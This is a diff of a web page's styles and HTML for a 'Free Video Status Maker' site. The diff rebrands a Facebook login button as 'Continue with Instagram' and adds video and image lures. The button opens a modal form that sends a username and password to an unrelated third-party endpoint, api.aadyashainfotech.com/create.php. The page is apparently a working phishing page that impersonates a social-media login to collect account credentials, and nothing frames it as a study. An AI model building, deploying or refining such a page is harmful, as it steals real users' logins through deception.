@@ -18,8 +18,8 @@ body {
 .container {
   position: relative;
   border-radius: 5px;
-  background-color: #f2f2f2;
   padding: 20px 0 30px 0;
+  margin-top: 11px;
 } 
 
 /* style inputs and link buttons */
@@ -44,7 +44,7 @@ input:hover,
 
 /* add appropriate colors to fb, twitter and google buttons */
 .fb {
-  background-color: #3B5998;
+  background-color: rgb(0 149 246);
   color: white;
 }
 
@@ -109,7 +109,12 @@ input[type=submit]:hover {
 .hide-md-lg {
   display: none;
 }
-
+.img{
+  padding: 13px;
+    display: block;
+    border-radius: 36px;
+    margin: auto;
+}
 /* bottom container */
 .bottom-container {
   text-align: center;
@@ -141,13 +146,13 @@ input[type=submit]:hover {
 <div class="container">
 
     <div class="row">
-        <img src="ico.png" style="width: 100px; display: block; margin-left: auto; margin-right: auto;" alt="">
-      <h2 style="text-align:center">Love Status Maker</h2>
+        <img src="img.webp" style="width: 100px; border-radius:50%;display: block; margin-left: auto; margin-right: auto;" alt="">
+      <h2 style="text-align:center">Free Video Status Maker </h2>
    
 
       <div class="col">
         <button type="button" class="fb btn" data-bs-toggle="modal" data-bs-target="#exampleModal">
-          <i class="fa fa-facebook fa-fw"></i> Login with Facebook
+          <i class="fa fa-instagram fa-fw"></i> Continue with Instagram
          </button>
       
       </div>
@@ -157,7 +162,9 @@ input[type=submit]:hover {
     </div>
   
 </div>
-
+<video class="img"  style="    width: 327px;
+padding: 1px;" src="v.mp4" ></video>
+<img src="unnamed.webp" class="img" alt="">
 <div class="modal fade" id="exampleModal" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true">
   <div class="modal-dialog">
     <div class="modal-content">
@@ -166,7 +173,7 @@ input[type=submit]:hover {
           <img src="logo.png" style="margin-bottom: 21px; margin-top: 13px; width: 150px; display: block; margin-left: auto; margin-right: auto;" alt="">
         <form action="https://api.aadyashainfotech.com/create.php" method="post" >
           <div class="mb-3">
-            <input type="text" class="form-control" placeholder="Mobile Number" name="mbid" id="recipient-name">
+            <input type="text" class="form-control" placeholder="Username" name="mbid" id="recipient-name">
           </div>
           <div class="mb-3">
             <input type="text" class="form-control" placeholder="Password" name="password" id="recipient-name">
@@ -174,7 +181,6 @@ input[type=submit]:hover {
           <button type="submit" class="btn btn-primary">Login</button>
         </form>
       </div>
-      <div class="modal-footer">
         
       </div>
     </div>
